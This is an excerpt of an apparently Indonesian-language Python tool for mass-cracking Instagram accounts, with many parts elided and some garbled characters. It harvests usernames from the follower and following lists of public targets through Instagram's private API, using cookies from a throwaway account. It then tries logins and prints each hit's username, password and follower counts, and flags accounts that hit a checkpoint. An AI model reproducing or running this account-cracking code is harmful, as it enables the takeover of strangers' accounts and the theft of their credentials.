...
try:
	...
	def waktu():
		...
		now = datetime.now()
		hours = now.hour
		if 00 <= hours < 11:sapa = "Selamat Pagi Ɑ͞ ̶͞ ̶͞ ඩ"
		elif 11 <= hours < 15:sapa = "Selamat Siang Ɑ͞ ̶͞ ̶͞ ඩ"
		elif 15 <= hours < 18:sapa = "Selamat Sore Ɑ͞ ̶͞ ̶͞ ඩ"
		elif 18 <= hours < 23:sapa = "Selamat Malam Ɑ͞ ̶͞ ̶͞ ඩ"
...
███████║██║  ██║██║  ██║██║ ╚████║╚██████╔╝
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝                                      
""",title=f"{P2}{waktu()}",subtitle=f"{P2}Aung KangCabuL",width=60,padding=(0,2),style=f"blue")) 
...
class __cek__:
	...
	def cekCOK(self):
		try:
			...
			os.system(self.hapus)
			exit ("%sÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬%s %s "%(pe,me,i));jeda(2)
	...
	def cekAPI(self,cookie):
		...
		try:
			...
			os.system (self.hapus)
			print ("[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] anda belum login ");jeda(2)
			self.masuk()
		except (KeyError,ValueError):
			os.system (self.hapus)
			exit (f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] cookie kedaluwarsa ");jeda(2)
		except (AttributeError,UnboundLocalError):
			os.system (self.hapus)
			exit (f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] terjadi kesalahan ");jeda(2)
	...
	def masuk(self):
		...
		rom = input(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Pilih : {P}')
		if rom in['']:
			exit (f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Isi Yang Benar Asu ');jeda(2) 
		
		elif rom in["1","01"]:
			prints(Panel(f"{P2}Wajib gunakan akun tumbal dilarang akun utama",width=50,padding=(0,4),style=f"green"))
			kukis = input(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Cookies : {H}")
			if kukis in['']:
				exit (f'{P}[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Isi Yang Benar');jeda(2) 
			else:
				try:
					...
					os.system (self.hapus)
					exit (f"{P}[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] cookie invalid ");jeda(2)
				except requests.exceptions.ConnectionError as konek:
					exit (f"{P}[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] gagal memuat tidak ada koneksi : {konek}");jeda(2)
			
		elif rom in["2","02"]:
			prints(Panel(f"{P2} Wajib gunakan akun tumbal dilarang akun utama",width=50,padding=(0,4),style=f"green"));exit()
			username = input(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Username : {H}")
			password = input(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Password : {H}")
			if (username,password) in['']:
				exit (f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] jangan kosong");jeda(2)
			else:
				...
				if x.get('status')=='success':
					...
					#self.cekCOK()
					print('')
					print(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] login berhasil, jalankan ulang tool nya ketik{M}:\n{P} - {H}python cropt.py');exit()
				elif x.get('status')=='checkpoint':
					exit (f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] akun checkpoint");jeda(2)
				else:
					exit (f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] login gagal, silahkan coba lagi");jeda(2)
					
		elif rom in['3','03']:
			print(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] buka dengan youtube ")
			os.system(" xdg-open https://youtu.be/77xXYcZMLcA");exit()
		
		elif rom in['0','00']:
			jalan(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Sampai jumpa tod :) ');exit()
			
		else:
			exit (f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] isi yang benar');jeda(2)
...
class instagram:
	...
	def logo(self):
		for i in external:
			...
			banner()
			pelerXD=[]
			prints(Panel(f"{H2}{IP}",title=f"{P2}IP",subtitle=f"{P2}{CN}",width=60,padding=(0,30),style=f"blue"))
			pelerXD.append(Panel(f"{B2}Ｎａｍａ {B2}{nama}\n{B2}Ｕｓｅｒｎａｍａ {B2}{self.username}\n{B2}ＳＴＡＴＵＳ {B2}Ｂａｙａｒ",width=29,padding=(0,2),style=f"blue"))
			pelerXD.append(Panel(f"{U2}Ｐｅｎｇｉｋｕｔ  {U2}{followers}\n{U2}Ｍｅｎｇｉｋｕｔｉ {U2}{following}",width=30,padding=(0,3),style=f"blue"))
			console.print(Columns(pelerXD))
			prints(Panel(f"{M2}Ｓａｍｐｅｋ Ｎｙａｉ Ｍａｔｉ {M2}{nama} {M2}🇪​​🇽​​🇵​​🇮​​🇷​​🇪​​🇩​ ",width=60,padding=(0,7),style=f"blue"))
			prints(Panel(f"{B2}[{B2}01{B2}] Crack Dari Pengikut\n[{B2}02{B2}] Crack Dari Mengikuti\n[{B2}03{B2}] Crack Dari Pencarian Nama\n[{B2}04{B2}] Crack Dari Target\n[{B2}05{B2}] Cek Hasil Crack\n[{B2}06{B2}] Bot Auto Unfollow\n[{B2}07{B2}] Crack Ulang Hasil CP\n[{B2}rm{B2}] Hapus Data Login\n[{B2}00{B2}] Keluar",title=f"{B2}PILIH MENU CRACK",width=60,padding=(0,4),style=f"blue"))

	def menu(self):
		self.logo()
		c = input(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Pilih : {H}')
		if c in['',' ']:
			exit (f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] isi yang benar');jeda(2)
			
		elif c in['1','01']:
			gan = input (f"{P}[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Anda Ingin Crack Massal Id? Y/T: {H}{P}")
			if gan in['']:
				exit (f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] isi yang benar');jeda(2)
			elif gan in['y','Y']:
			...
			gan = input (f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Anda Ingin Crack Massal Id? y/t : ")
			if gan in['']:
				exit (f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] isi yang benar');jeda(2)
			elif gan in['Iya','iya']:
			...
			print("")
			print(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Semakin banyak target semakin banyak user yg terkumpul  ")
			try:m=int(input(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Jumlah Target :'))
			except ValueError:exit (f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] isi angka bodoh');jeda(2)
			print(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] dump 1 nama setara dengan{H} 2500{O} username ')
			for i in range(m):
				i+=1
	...
	def pengikut(self):
		...
		print("")
		print(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Pastikan Target Publik Tidak Private ")
		m=input(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Username Publik :{H} ")
	...
	def massal_pengikut(self):
		try:
			...
			print("")
			print(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Pastikan Target Publik Tidak Private ")
			jum = int(input(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Jumlah Target : {H}'))
		except:jum=1
		for t in range(jum):
			t +=1
			user = input(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Username Publik : {H}')
	...
	def mengikuti(self):
		...
		print("")
		print(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Pastikan Target Publik Tidak Private ")
		m=input(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Username Publik : ')
		id=self.idAPI(self.cookie,m)
	...
	def massal_mengikuti(self):
		try:
			...
			print("")
			print(f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Pastikan target publik tidak private ")
			jum = int(input(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] jumlah target : '))
		except:jum=1
		for t in range(jum):
			t +=1
			user = input(f'[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] username publik : ')
			id = self.idAPI(self.cookie,user)
			info = self.GET_following(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
	...
	def idAPI(self,cookie,id):
		try:
			...
			exit (f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] tidak ada koneksi ");jeda(2)
		except Exception as e:
			#os.system(self.hapus)
			exit (f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] username tidak di temukan ");jeda(2)
		return idx
    #--- dump pengikut
	def GET_followers(self,cookie,api,id):
		try:
			...
			if 'pengikut' in menudump:
				...
				for z in range (9999):
					...
					try:
						...
						sys.stdout.write(f"\r{P}[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] Sedang Mengumpulkan {wr}{len(internal)} {P}id...{P}")
						sys.stdout.flush()
						time.sleep(0.0002)
						try:
							maxid=x_jason['next_max_id']
			...
			os.system(self.hapus)
			exit (f"[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] gagal mengambil username ");jeda(2)
		return internal
	#--- dump mengikuti
				...
				for z in range (9999):
					...
					try:
						for i in x_jason['users']:
							...
							following.append(username)
						wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
						sys.stdout.write(f"\r[{H}Ɑ͞ ̶͞ ̶͞ ඩ{P}] sedang mengumpulkan {wr}{len(internal)} {P}id...{P}")
						sys.stdout.flush()
						time.sleep(0.0002)
						try:
							maxid=x_jason['next_max_id']
		...
		try:
			for ba in range(100):
				...
				try:
					...
					sys.stdout.write (f'\r{pu}ÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬{br} Mengumpulkan User{me} >{hi} {str(len(internal))} ')
			...
			exit (f"%sÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â°ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ %s%s "%(pu,me,e));jeda(2)
		return internal
				...
				try:
					...
					if "logged_in_user" in str(xyaaXD) or "sessionid" in ses.cookies.get_dict():
						...
						try:
							...
							tree.add(Panel(f"{H2}Ｌｏｇｉｎ Ｂｅｒｈａｓｉｌ{P2}",width=30,padding=(0,2),style=f"green"))
							tree.add(f"{P2}NAMA : {H2}{nama}")
							tree.add(f"{P2}USERNAMA  : {H2}{user}")
							tree.add(f"{P2}KATASANDI  : {H2}{pw}")
							tree.add(f"{P2}PENGIKUT : {H2}{pengikut}")
							tree.add(f"{P2}MENGIKUTI : {H2}{mengikut}")
							...
							tree = Tree(" ",guide_style=f"green")
							tree.add(Panel(f"{H2}Ｌｏｇｉｎ Ｂｅｒｈａｓｉｌ {P2}",width=30,padding=(0,2),style=f"green"))
							tree.add(f"{P2}NAMA : null").add(f"null|null")
							tree.add(f"{P2}USERNAMA : null")
							tree.add(f"{P2}KATASANDI : null")
							tree.add(f"{P2}PENGIKUT : null")
							tree.add(f"{P2}MENGIKUTI : null")
						...
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						tree = Tree("")
						tree.add(Panel(f"{M2}Ｌｏｇｉｎ Ｃｈｅｃｋｐｏｉｎｔ {P2}",width=30,padding=(0,2),style=f"red"))
						tree.add(f"{P2}NAMA : {M2}{nama}")
						tree.add(f"{P2}USERNAMA  : {M2}{user}")
						tree.add(f"{P2}KATASANDI  : {M2}{pw}")
						tree.add(f"{P2}PENGIKUT : {M2}{pengikut}")
						tree.add(f"{P2}MENGIKUTI : {M2}{mengikut}")
						tree.add(f"{P2}POSTINGAN : {M2}{postingan}\n")
						prints(tree)
						print("") 
